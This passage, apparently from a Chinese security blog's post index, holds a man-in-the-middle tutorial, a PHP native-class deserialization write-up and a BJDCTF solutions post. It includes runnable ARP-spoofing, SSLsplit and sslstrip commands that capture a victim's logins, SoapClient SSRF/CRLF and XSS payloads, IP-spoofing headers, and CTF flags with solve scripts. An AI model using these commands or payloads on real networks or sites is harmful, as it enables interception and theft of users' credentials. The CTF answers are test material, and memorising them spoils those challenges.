随便找了个不是https的站点，可以看到已经注入成功 替换所有图片，随便找的一个站点，没什莫特别的意思 替换下载文件 我们试着下载一个exe 和kali里生成的后门一样 伪造证书抓https首先，我们需要一份数字根证书，可以用openssl生成 先生成证书私钥文件 1openssl genrsa -out ca.key 2048 然后用私钥签名生成证书： 1openssl req -new -x509 -days 1096 -key ca.key -out ca.crt 再介绍一下工具SSLsplit 透明SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成客户端 伪装服务器需要伪装证书 支持SSL/TLS加密的SMTP POP3 FTP等通信中间人攻击 参数： -k 指定私钥key文件，进行欺骗 -c 指定Root CA证书文件 -D Debug模式，用于输出SSLSplit状态，建议使用时加上 -j 指定log目录地址 -S 指定-j参数目录下需要记录截断GET、POST请求的子目录地址 -l 指定存储的连接信息文件 ssl IP 端口 指定ssl需要监听的端口 tcp IP 端口 指定tcp需要监听的端口 打开ip_forward功能 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 进行端口转发，即将本机443等端口转发到SSLsplit监听的端口，这里是8080和8443 1234567iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 查看一下设置 1iptables -t nat -L 开启arp欺骗 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 SSLsplit监听 1sslsplit -D -l connect.log -j /root/Desktop/d -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 此时打开百度，发现有这种提醒，如果忽略危害直接打开，我们的账号等信息就会被窃取 当然，如果通过特殊途径把证书装到了受害者的设备上，就不会有提醒，所有的信息也会被解密 这种效果不太好，很卡，而且图片显示不出来，也不知道为啥 随便输一个账号，看到里面有信息 虽然效果不算理想，但也不失为一种方式，大佬的解释感觉很好 https 降级攻击攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。 SSLstrip工具主要利用了上面的原理 github地址：https://github.com/moxie0/sslstrip 用iptables把80端口的流量转发到sslstrip监听的8080端口上 12iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 然后SSlstrip监听 1sslstrip -l 8080 开启arp欺骗 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 ip转发 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 通常情况下我们访问百度的时侯都会强制转换成https，但现在我们访问都是http了，https的无法打开，所以说这个也有一定的局限性，以后看看还有其他方法没 参考： https://blog.csdn.net/qq_42025840/article/details/81604497 https://www.freebuf.com/sectool/118574.html https://blog.csdn.net/ysynhtt/article/details/39996933 https://www.freebuf.com/sectool/48016.html","categories":[],"tags":[{"name":"折腾","slug":"折腾","permalink":"http://www.moonback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"中间人攻击","slug":"中间人攻击","permalink":"http://www.moonback.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"}]},{"title":"PHP反序列化之原生类","slug":"php反序列化之php原生类","date":"2020-03-22T13:54:47.000Z","updated":"2021-04-05T14:47:20.787Z","comments":true,"path":"2020/03/22/php反序列化之php原生类/","link":"","permalink":"http://www.moonback.xyz/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/","excerpt":"本篇博客主要介绍了php原生类反序列化的相关内容！","text":"本篇博客主要介绍了php原生类反序列化的相关内容！ 基础知识先回顾一下： 123456当对象被创建的时候调用：__construct()当对象被销毁的时候调用：__destruct()当对象被当作一个字符串使用时候调用(不仅仅是echo的时候,比如file_exists()判断也会触发)：__toString()序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep()反序列化恢复对象之前就调用此方法：__wakeup()当调用对象中不存在的方法会自动调用此方法：__call() 我们可以用这个脚本看一下php内置类 12345678910111213141516171819202122 &lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#x27;__destruct&#x27;, &#x27;__toString&#x27;, &#x27;__wakeup&#x27;, &#x27;__call&#x27;, &#x27;__callStatic&#x27;, &#x27;__get&#x27;, &#x27;__set&#x27;, &#x27;__isset&#x27;, &#x27;__unset&#x27;, &#x27;__invoke&#x27;, &#x27;__set_state&#x27; ))) &#123; print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;; &#125; &#125;&#125; 有些类不一定能够进行反序列化，php中使用了zend_class_unserialize_deny来禁止一些类的反序列化 常用的有下面这些 SoapClient从php手册我们可以看到有这麽多方法 soapclient有两种工作模式，wsdl和非wsdl模式，WSDL 用来描述如何访问具体的接口，soap协议的具体格式可以参考这篇文章，soap采用http或者https协议发送数据，并且在http header头中通过soap action来标示自己是一个soap请求 https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html 这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类 当然要保证php开启soap扩展 SSRF： 由于__call()方法会在调用没有的方法调用，所以我们构造: 123456&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); soap类我们可以自定义User-Agent，http header里有两个重要的参数Content-Type为和Content-Length我们可以进行CRLF注入，而User-Agent的http header位置正好在这些之上，所以可以进行覆盖对于Content-Type，如果我们想要利用CRLF发送post请求，那么要求它为application/x-www-form-urlencode那么此时就可以利用CRLF，构造如下payload： 123456789101112131415&lt;?php$target = &quot;http://example.com:5555/&quot;;$post_string = &#x27;data=abc&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;);$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;. (string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt;&#x27;hello&#x27;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$aaa);echo urlencode($aaa);//Test$c = unserialize($aaa);$c-&gt;notexists(); Error只适用于php7版本 XSS: 123456789&lt;?php$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$t = urldecode(&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;);$c = unserialize($t);echo $c; Exception适用于php5、7版本 XSS: 12345678&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);// echo urlencode($b);//Test$c = urldecode(&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;);echo unserialize($c); 列目录读文件SLP类中存在能够进行文件处理和迭代的类： 类 描述 DirectoryIterator 遍历目录 FilesystemIterator 遍历目录 GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag* SplFileObject 读取文件，按行读取，多行需要遍历 finfo/finfo_open() 需要两个参数 可以控制进行列目录 12345&lt;?php$a = new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123; echo($f-&gt;__toString().&quot;\\n&quot;);&#125; 参考： https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html https://www.plasf.cn/articles/dasctf202103.html","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"},{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"BJDCTF 2nd writeup","slug":"BJDCTF-2rd-writeup","date":"2020-03-21T09:50:39.000Z","updated":"2020-05-22T08:34:39.717Z","comments":true,"path":"2020/03/21/BJDCTF-2rd-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/03/21/BJDCTF-2rd-writeup/","excerpt":"本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!","text":"本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl! MISC最简单的misc下载下来是secret.zip，zip伪加密，搜索标志位14 00 09 00将其替换成14 00 00 00 解压得到secret，hex编辑器查看发现是png图片格式确少文件头 常见文件文件头尾： 123456JPEG (jpg) 文件头：FFD8FF 文件尾：FF D9 PNG (png) 文件头：89504E47 文件尾：AE 42 60 82GIF (gif) 文件头：47494638 文件尾：00 3B ZIP Archive (zip) 文件头：504B0304 文件尾：50 4BRAR Archive (rar) 文件头：52617221Wave (wav) 文件头：57415645AVI (avi) 文件头：41564920 因此我们补上89 50 4E 47 16进制转ASCII就得到flag了 A_Beautiful_Picture下载下来是Misc-A_Beautiful_Picture-DreamerJack.png 题目考察的是改高度，直接看分辨率也能看出点猫腻 hxd打开,直接改就能得到flag EasyBaBa下载下来ezbb.jpg，foremost分离出00000061.zip，解压得到里面都是出题人.jpg 发现可以用视频播放器播放，在其中找到了4张二维码，分别截屏下来扫下，得到4个16进制字符串 1234566167696E5F6C6F76655F59424A447B696D316E677D6167696E5F6C6F76655F59424A447B696D316E677DBJD&#123;imagin_love_Y1ng&#125; 小姐姐这题应该是最简单的，想了半年，我这脑子！ 直接strings命令或者Hxd打开就能找到，应该搜索的，哎！要仔细啊！ Real_EasyBaBa下载下来是ezbb_r.png，formost分离出来00000000.jpg 两图片都一样也能正常显示，但大小不一样，hxd对比一下,发现多了下面内容 单独分析一下，发现有50 4B很明显是压缩包，FF是多余的删掉，加上zip的头50 4B 03 04,结果如下图 解压得到hint，打开都是#,刚开始以为是神么加密呢，仔细一瞅是二维码 不过好像扫不了，看知乎大佬的做法是将#替换成■，在sublime里虽然大二维码扫不了，但右边的小二维码能扫出来 不用替换也能扫，sublime真好,扫出来是： 1od -vtx1 ./draw.png | head -56 | tail -28 直接输入命令，发现 看到有好多00 ff，把00替换为空会发现 得到flag: 1BJD&#123;572154976&#125; 圣火昭昭下载下来是一张图片，查看详细属性发现有 1新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如 解密网址：http://hi.pcmoe.net/buddha.html 解密得到 1gemlove 提示开局一张图，flag全靠猜 outgess解密 1outguess -r sheng_huo_zhao_zhao.jpg -k gemlove -t 1.txt 得到flag 1BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125; TARGZ下载下来是hW1ES89jF.tar.gz，file查看发现是zip，不知道密码，拿文件名试下 发现解压出来了，还是zip加密文件，密码还是文件名 盗用一下颖奇师傅的脚本： 1234567891011121314151617import osimport timeimport filetypewhile 1: aa = os.popen(&#x27;ls&#x27;) filename = aa.read().replace(&#x27;decompress.py&#x27;,&#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) a = filename.replace(&#x27;.tar.gz&#x27;, &#x27;&#x27;) kind = filetype.guess(filename) time.sleep(0.1) if kind.extension is &#x27;zip&#x27;: os.system(&quot;mv &#123;&#125; &#123;&#125;.zip&quot;.format(filename, a)) os.system(&quot;unzip -P &#123;&#125; &#123;&#125;.zip&quot;.format(a,a)) os.system(&quot;rm *.zip&quot;) else: break flag: 1BJD&#123;wow_you_can_rea11y_dance&#125; 开场曲下载下来是mp4，可以看到是mikutap，听力题，干就完事了 真不好听 1BJD&#123;MIKUTAP3313313&#125; CRYPTO老文盲了打开发现是繁体字,一个一个搜发现是flag的拼音 1234罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da kuo haoBJD&#123;这就是flag直接交了吧&#125;BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125; cat_flaggif图片发现是有规律的，每行刚好八个空，符合二进制 12345678910111201000010 4201001010 4a01000100 4401111011 7b01001101 4d00100001 2101100001 6100110000 3001111110 7e01111101 7d424a447b4d2161307e7dBJD&#123;M!a0~&#125; 灵能精通下载下来是jpg，搜了下是圣堂武士密码(Templar Cipher)，有以下规则 对照着翻译一下 1IMKNIGHTSTEMPLAR 加上flag{}提交就行 燕言燕语一串16进制字符串，转字符，后面很像flag 12379616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; 维吉尼亚密码,key是yanzi 1BJD&#123;yanzi_jiushige_shabi&#125; Y1nglish题目考察的是词频分析 quipqiup网址：https://quipqiup.com/ 得到 1BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125; 读下原文发现发现networy之类的单词，是说network，所以y变k 直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck 最终flag 1BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125; RSA0还是做做吧，密码学很重要 nc连上之后得到 123456789e&#x3D;9253957p+q&#x3D;17197527204660991016930035408263123809040259877847603169542637378767706716259296178344873534778882815738410150250641562554942554918768482130124973070602070p-q&#x3D;3283501127743182851935633688746582507377540025586758980645892783208704644171247118527903889977325160707479059917010713382755395132590641870700044646202392c&#x3D;30471926191609574952020582344350552307428327163031930955084335343130571238539821732378881111036918563115746281652391681966650016526753032232063719399910844180688651845390340809415668659489594779658849946746379795794343633651023334497181833824386697589969010288147535772453380700224010501799051558826899635431flag&#x3D;?????? 先介绍一下RSA算法，RSA算法涉及三个参数，N，e，d，公钥为(N，e)，私钥为(N，d)，其中N是两个大素数p，q的乘积。 加密过程： 首选取两个互质数 p q，那么p * q 得到 N，这时要计算出φ(N)φ函数φ(N)是指小于或等于N的正整数中与N互质的数的数目。 根据欧拉公式，前提p q都是质数 1φ(N) &#x3D; (p-1)*(q-1) 这时候随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质 接着计算e对**φ(n)**的模逆元 1e*d ≡ 1 (mod φ(n)) ≡是数论中表示同余的符号，可以看到符号右边恒等于1，即 1(e*d) mod φ(n)&#x3D;1 简单的说就是 e*d除以**φ(N)**得到的余数为1，可以转化为 1e*d - 1 &#x3D; kφ(n) 这时侯我们只有k,d不知道，可以用辗转相除法来计算，神魔是辗转相除法呢？举个例子 12345678910比如说一个不定方程3x+5y&#x3D;28,我们要求其整数解用大的数除以小的数 5&#x3D;3*1+2 --&gt; 余数2&#x3D;5-3*1然后再用余数与原来的除数相除以，还是大的除以小的 3&#x3D;2*1+1 --&gt; 余数1&#x3D;3-2*1此时发现除数2(原来的余数)与余数1可以整除，停止除法2是由第一步来的，所以我们倒推回去1&#x3D;3-2*1&#x3D;3-(5-3*1)*1&#x3D;3-5+3*1&#x3D;3*2-5 即3*2-5&#x3D;1等号两端同乘以2828*2*3+28*(-1)*5&#x3D;2856*3+(-28)*5&#x3D;28x&#x3D;56 y&#x3D;-28 特解 同样我们也能求出模逆元 12345678首先对余数进行辗转相除：N &#x3D; A * a0 + r0A &#x3D; r0 * a1 + r1r0 &#x3D; r1 * a2 + r2r1 &#x3D; r2 * a3 + r3…rn-2 &#x3D; rn-1 * an + rnrn-1 &#x3D; rn * an+1 + 0 对上面的商数逆向排列（不含余数为0的商数）： 其中：b-1 = 1b0 = anbi = an-1 * bi-1 + bi-2如果n为奇数（即商个数为偶数），则bn即为所求的逆元B；如果n为偶数（即商个数为奇数），则N-bn即为所求的逆元B。 举两个例子： 12345678求61关于模105的逆。先对余数辗转相除：105 &#x3D; 61 * 1 + 4461 &#x3D; 44 * 1 + 1744 &#x3D; 17 * 2 + 1017 &#x3D; 10 * 1 + 710 &#x3D; 7 * 1 + 37 &#x3D; 3 * 2 + 13 &#x3D; 1 * 3 + 0 将商数逆序排列： 由于商的个数为偶数，因此31即为61关于模105的逆元。(31 * 61 = 105 * 18 + 1) 1234567求31关于模105的逆，先对余数辗转相除：105 &#x3D; 31 * 3 + 1231 &#x3D; 12 * 2 + 712 &#x3D; 7 * 1 + 57 &#x3D; 5 * 1 + 25 &#x3D; 2 * 2 + 12 &#x3D; 1 * 2 + 0 将商数逆序排列： 由于商的个数为奇数，因此105-44=61即为31关于105的逆元 知道模逆元怎末求得了，然后我们就进行加密吗，m是明文，c是密文 1m^e ≡ c (mod N) 解密 1c^d ≡ m (mod N) 再回到这道题 由p+q和p-q我们能算出p,q，即N=p*q也知道了，c是密文，e也知道直接用gmpy2就能算出d，exp: 1234567891011import gmpy2e=8817541paq=16321432012361424715999482612620733350248842171519096058290401228839812649586719552027326066167539574579803995633219307746250179205827394262822225496256560psq=-762917520212563308246814613407392836711488448360655007080799273105995688894593100287666509669227799508891920589926279868282905643495952401909422097272782c=50489857463808300926430257877498323881188812748322681976260520202074367690898181749018527743434038118959830923111311450056657583556281704259092120255347994094472328493911537046586917971842411521641278869273145554989991259437124572940334561139020989426695807874811943663373081092453657052151887455784297691646p = (paq+psq)//2q = (paq-psq)//2d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, p*q)print(m) 之后转16进制转字符串就行 gmpy2安装参考：https://www.cnblogs.com/threesoil/p/9926669.html RSA1和第一题差不多 本题每访问一次都会给一组随机的e和c，但是p^2+q^2和p-q不变，因此可以考虑共模攻击 1234567p^2+q^2&#x3D;233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050p-q&#x3D;-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428c&#x3D;87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463flag&#x3D;?????? exp: 12345678910111213141516171819202122232425262728293031323334from gmpy2 import invertdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)c1 = 87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463e1 = 11398291c2 = 18705967865609703350505203897353013349572268163704731296055745391917469960518910212955107755812854024901962046413249126535525965403804342347153196889210756001085291251582862612150330490682927199414305833505087697733874760767084138461692058648555896587248051209761491427866198455080624903527433009258377083135e2 = 11511989A = 233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050B = -5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428n = (A-B**2)//2# print ns = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(m) WEB假猪套天下第一这题真的很。。。 尝试admin，提示不是admin 随便登个账号，抓包，在html结尾发现L0g1n.php 访问发现一环套一环，最后构造就能得到flag的base64编码形式了 伪造ip: 123456789X-Forwarded-For:127.0.0.1X-Forwarded-Host:127.0.0.1X-Client-IP:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1 记一下http的常见字段： 请求字段 协议头字段名 说明 示例 状态 Accept 能够接受的回应内容类型（Content-Types）。参见内容协商。 Accept: text/plain 常设 Accept-Charset 能够接受的字符集 Accept-Charset: utf-8 常设 Accept-Encoding 能够接受的编码方式列表。参考HTTP压缩。 Accept-Encoding: gzip, deflate 常设 Accept-Language 能够接受的回应内容的自然语言列表。参考 内容协商 。 Accept-Language: en-US 常设 Accept-Datetime 能够接受的按照时间来表示的版本 Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT 临时 Authorization 用于超文本传输协议的认证的认证信息 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== 常设 Cache-Control 用来指定在这次的请求/响应链中的所有缓存机制 都必须 遵守的指令 Cache-Control: no-cache 常设 Connection 该浏览器想要优先使用的连接类型[8] Connection: keep-alive``Connection: Upgrade 常设 Cookie 之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie Cookie: $Version=1; Skin=new; 常设: 标准 Content-Length 以 八位字节数组 （8位的字节）表示的请求体的长度 Content-Length: 348 常设 Content-MD5 请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果 Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== 过时的[9] Content-Type 请求体的 多媒体类型 （用于POST和PUT请求中） Content-Type: application/x-www-form-urlencoded 常设 Date 发送该消息的日期和时间(按照 RFC 7231 中定义的”超文本传输协议日期”格式来发送) Date: Tue, 15 Nov 1994 08:12:31 GMT 常设 Expect 表明客户端要求服务器做出特定的行为 Expect: 100-continue 常设 From 发起此请求的用户的邮件地址 From: user@example.com 常设 Host 服务器的域名(用于虚拟主机 )，以及服务器所监听的传输控制协议端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。[10] 自超文件传输协议版本1.1（HTTP/1.1）开始便是必需字段。 Host: en.wikipedia.org:80``Host: en.wikipedia.org 常设 If-Match 仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。 If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot; 常设 If-Modified-Since 允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ） If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT 常设 If-None-Match 允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ），参考 超文本传输协议 的实体标记 If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot; 常设 If-Range 如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体 If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot; 常设 If-Unmodified-Since 仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。 If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT 常设 Max-Forwards 限制该消息可被代理及网关转发的次数。 Max-Forwards: 10 常设 Origin 发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制-允许来源’（’Access-Control-Allow-Origin’）字段）。 Origin: http://www.example-social-network.com 常设: 标准 Pragma 与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。 Pragma: no-cache 常设但不常用 Proxy-Authorization 用来向代理进行认证的认证信息。 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== 常设 Range 仅请求某个实体的一部分。字节偏移以0开始。参见字节服务。 Range: bytes=500-999 常设 Referer [*sic*] [11] 表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。 Referer: http://en.wikipedia.org/wiki/Main_Page 常设 TE 浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。 TE: trailers, deflate 常设 User-Agent 浏览器的浏览器身份标识字符串 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0 常设 Upgrade 要求服务器升级到另一个协议。 Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 常设 Via 向服务器告知，这个请求是由哪些代理发出的。 Via: 1.0 fred, 1.1 example.com (Apache/1.1) 常设 Warning 一个一般性的警告，告知，在实体内容体中可能存在错误。 Warning: 199 Miscellaneous warning 常设 常见的非标准请求字段 字段名 说明 示例 X-Requested-With 主要用于标识 Ajax 及可扩展标记语言 请求。大部分的JavaScript框架会发送这个字段，且将其值设置为 XMLHttpRequest X-Requested-With: XMLHttpRequest DNT[12] 请求某个网页应用程序停止跟踪某个用户。在火狐浏览器中，相当于X-Do-Not-Track协议头字段（自 Firefox/4.0 Beta 11 版开始支持）。Safari 和 Internet Explorer 9 也支持这个字段。2011年3月7日，草案提交IETF。[13] 万维网协会 的跟踪保护工作组正在就此制作一项规范。[14] DNT: 1 (DNT启用)``DNT: 0 (DNT被禁用) X-Forwarded-For[15] 一个事实标准 ，用于标识某个通过超文本传输协议代理或负载均衡连接到某个网页服务器的客户端的原始互联网地址 X-Forwarded-For: client1, proxy1, proxy2``X-Forwarded-For: 129.78.138.66, 129.78.64.103 X-Forwarded-Host[16] 一个事实标准 ，用于识别客户端原本发出的 Host 请求头部[17]。 X-Forwarded-Host: en.wikipedia.org:80``X-Forwarded-Host: en.wikipedia.org X-Forwarded-Proto[18] 一个事实标准，用于标识某个超文本传输协议请求最初所使用的协议。[19] X-Forwarded-Proto: https Front-End-Https[20] 被微软的服务器和负载均衡器所使用的非标准头部字段。 Front-End-Https: on X-Http-Method-Override[21] 请求某个网页应用程序使用该协议头字段中指定的方法（一般是PUT或DELETE）来覆盖掉在请求中所指定的方法（一般是POST）。当某个浏览器或防火墙阻止直接发送PUT 或DELETE 方法时（注意，这可能是因为软件中的某个漏洞，因而需要修复，也可能是因为某个配置选项就是如此要求的，因而不应当设法绕过），可使用这种方式。 X-HTTP-Method-Override: DELETE X-ATT-DeviceId[22] 使服务器更容易解读AT&amp;T设备User-Agent字段中常见的设备型号、固件信息。 X-Att-Deviceid: GT-P7320/P7320XXLPG X-Wap-Profile[23] 链接到互联网上的一个XML文件，其完整、仔细地描述了正在连接的设备。右侧以为AT&amp;T Samsung Galaxy S2提供的XML文件为例。 x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml Proxy-Connection[24] 该字段源于早期超文本传输协议版本实现中的错误。与标准的连接（Connection）字段的功能完全相同。 Proxy-Connection: keep-alive X-Csrf-Token[25] 用于防止 跨站请求伪造。 辅助用的头部有 X-CSRFToken[26] 或 X-XSRF-TOKEN[27] X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 回应字段 字段名 说明 例子 状态 Access-Control-Allow-Origin 指定哪些网站可参与到跨来源资源共享过程中 Access-Control-Allow-Origin: * 临时 Accept-Patch[28] 指定服务器支持的文件格式类型。 Accept-Patch: text/example;charset=utf-8 常设 Accept-Ranges 这个服务器支持哪些种类的部分内容范围 Accept-Ranges: bytes 常设 Age 这个对象在代理缓存中存在的时间，以秒为单位 Age: 12 常设 Allow 对于特定资源有效的动作。针对HTTP/405这一错误代码而使用 Allow: GET, HEAD 常设 Cache-Control 向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒 Cache-Control: max-age=3600 常设 Connection 针对该连接所预期的选项[8] Connection: close 常设 Content-Disposition[29] 一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。 Content-Disposition: attachment; filename=&quot;fname.ext&quot; 常设 Content-Encoding 在数据上使用的编码类型。参考 超文本传输协议压缩 。 Content-Encoding: gzip 常设 Content-Language 内容所使用的语言[30] Content-Language: da 常设 Content-Length 回应消息体的长度，以 字节 （8位为一字节）为单位 Content-Length: 348 常设 Content-Location 所返回的数据的一个候选位置 Content-Location: /index.htm 常设 Content-MD5 回应内容的二进制 MD5 散列，以 Base64 方式编码 Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== 过时的[31] Content-Range 这条部分消息是属于某条完整消息的哪个部分 Content-Range: bytes 21010-47021/47022 常设 Content-Type 当前内容的MIME类型 Content-Type: text/html; charset=utf-8 常设 Date 此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示) Date: Tue, 15 